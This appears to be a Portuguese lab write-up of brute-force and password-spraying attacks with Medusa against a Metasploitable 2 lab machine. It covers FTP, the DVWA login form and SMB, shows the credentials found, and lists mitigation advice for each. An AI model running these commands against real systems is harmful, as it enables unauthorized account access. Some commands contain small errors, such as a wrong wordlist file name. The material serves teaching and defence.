# Simulando-um-Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

Ver o IP da máquina do alvo no terminal do Metasploitable 2:
> ip a
> 192.168.56.101

Abrir o terminal do Kali:
Criar uma wordlist de usuário e senha
> echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
> echo -e 'pass\nmsfadmin\nadmin\nroot' > pass.txt

Usar a ferramenta Medusa direto no FtP
> medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6

sucess/user: msfadmin pass: msfadmin

Recomendações de mitigação:
Limitar tentativas de login
Configure o servidor FTP para bloquear o IP após várias tentativas falhas.

Mitigação em nível de rede (Firewall / IDS / IPS):
Bloquear IPs suspeitos
use ferramentas de bloqueio automático

Restringir acesso por IP:
Se o FTP é interno ou usado apenas por certos clientes, limite os IPs autorizados no firewall (iptables, ufw, firewalld ou no próprio roteador).

Fortalecer autenticação:
Exigir senhas fortes
Use políticas de senha (mín. 10 caracteres, com letras, números e símbolos).
Proíba credenciais padrão (“admin”, “ftp”, “guest” etc.)

Monitoramento e auditoria:
Habilitar logs detalhados
Revise regularmente os logs de acesso (/var/log/vsftpd.log, /var/log/auth.log, etc.).
Configure alertas para tentativas excessivas de login.

Ataques de força bruta aplicados em formulários de login em sistemas Web:
Entrar no navegador com o endereço: 
exemplo: 192.168.56.101/dvwa/login.php

Criar wordlist:
> echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
> echo -e 'pass\nmsfadmin\nadmin\nroot' > pass.txt
> echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

Usar o Medusa para localizar credenciais válidas:
> medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \ -m PAGE:'/dvwa/login.php' \ -m FORM:'username='USER'6password='PASS'6Login=Login' \ -m 'FAIL=Login failed' -t 6
Sucess/user: admin password: password

Voltar no formulário e digitar a senha descoberta:
user: admin password: password
Sucess


Recomendações de mitigação:
Autenticação
MFA e senhas fortes
Impede acesso mesmo com senha roubada

Rede
TLS/HTTPS/SFTP
Protege credenciais no tráfego

Sistema
Bloqueio após falhas
Reduz brute force

Monitoramento
Logs + alertas
Detecta uso indevido

Usuários
Treinamento antifraude
Evita phishing

Armazenamento
Hashing seguro
Protege banco de dados

Ataque em cadeia,enumeração smb + password sprayin:
> enum4linux -a 192.168.56.101 | tee enum4_output.txt
abrir o comando:
> less enum4_output.txt
acesso aberto!

Criando uma wordlist de usuários e senhas:
> echo -e 'user\nmsfadmin\nservice' > smb_users.txt
> echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
Usar o Medusa:
> medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
FOUND/user: msfadmin password: msfadmin
sucess

Testando acesso utilizando smbclient:
>smbclient -L //192.168.56.101 -U msfadmin
Acesso aberto!













